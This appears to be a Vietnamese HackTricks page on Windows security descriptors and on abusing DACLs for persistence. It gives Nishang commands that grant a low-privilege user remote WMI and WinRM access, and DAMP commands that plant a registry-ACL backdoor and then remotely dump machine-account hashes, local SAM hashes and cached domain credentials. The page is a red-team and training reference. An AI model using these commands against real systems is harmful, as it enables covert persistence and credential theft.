# Bộ mô tả bảo mật

{{#include ../../banners/hacktricks-training.md}}

## Bộ mô tả bảo mật

Bộ mô tả bảo mật của Windows chứa SID của chủ sở hữu, SID của nhóm chính, ACL tùy ý (DACL) kiểm soát quyền truy cập và ACL hệ thống (SACL) chủ yếu dùng cho mục đích kiểm tra. Ngôn ngữ định nghĩa bộ mô tả bảo mật (SDDL) là dạng biểu diễn bằng văn bản; chuỗi ACE có dạng `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

Bộ mô tả bảo mật lưu thông tin về chủ sở hữu của một đối tượng có thể được bảo vệ và các principal được phép hoặc bị từ chối những quyền cụ thể đối với đối tượng đó. Nếu kẻ tấn công có thể thay đổi DACL, họ có thể cấp cho một principal có ít đặc quyền những quyền thường đòi hỏi vai trò quản trị.

Vì vậy, các bộ mô tả được sửa đổi có chọn lọc rất hữu ích cho mục đích duy trì quyền truy cập: tài khoản vẫn nằm ngoài các nhóm đặc quyền dễ nhận thấy nhưng vẫn có quyền truy cập vào một bề mặt quản lý cụ thể. Hãy lưu lại bộ mô tả ban đầu trước khi kiểm tra để có thể hoàn tác chính xác thay đổi.

### Quyền truy cập vào WMI

Bạn có thể cấp cho người dùng quyền **thực thi WMI từ xa** [**bằng cách sử dụng đoạn mã này**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:

```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```

### Truy cập WinRM

Cấp cho người dùng quyền truy cập vào endpoint PowerShell/WinRM từ xa bằng hàm `Set-RemotePSRemoting` của Nishang:<sup>[[2]](#references)</sup>

```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```

### Truy cập từ xa vào các hash

DAMP có thể tạo một backdoor registry-ACL, cho phép truy xuất từ xa hash của tài khoản máy, các hash SAM cục bộ và thông tin xác thực miền được lưu trong bộ nhớ đệm. Cấp các quyền hạn chế này cho một tài khoản thông thường—đặc biệt là trên domain controller—mang lại khả năng duy trì quyền truy cập mạnh mẽ mà không cần tài khoản thuộc nhóm đặc quyền.<sup>[[3]](#references)</sup>

```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```

Xem [**Silver Tickets**](silver-ticket.md) để tìm hiểu cách bạn có thể sử dụng hash của tài khoản máy tính của Domain Controller.

## References

- [1] [Ngôn ngữ định nghĩa Security Descriptor - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Dự án sửa đổi ACL tùy ý](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Định dạng chuỗi Security descriptor](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
